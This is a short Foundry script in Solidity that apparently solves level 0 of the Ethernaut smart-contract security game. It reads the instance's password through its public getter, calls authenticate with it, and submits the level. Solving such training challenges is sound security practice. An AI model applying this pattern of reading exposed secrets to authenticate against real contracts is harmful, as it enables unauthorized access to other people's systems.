// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {ILevel00} from "../interfaces/ILevel00.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";

contract Level00 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));

    function run() public {
        ILevel00 instance = ILevel00(vm.envAddress("LVL00_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        instance.authenticate(instance.password());

        ethernaut.submitLevelInstance(address(instance));

        vm.stopBroadcast();
    }
}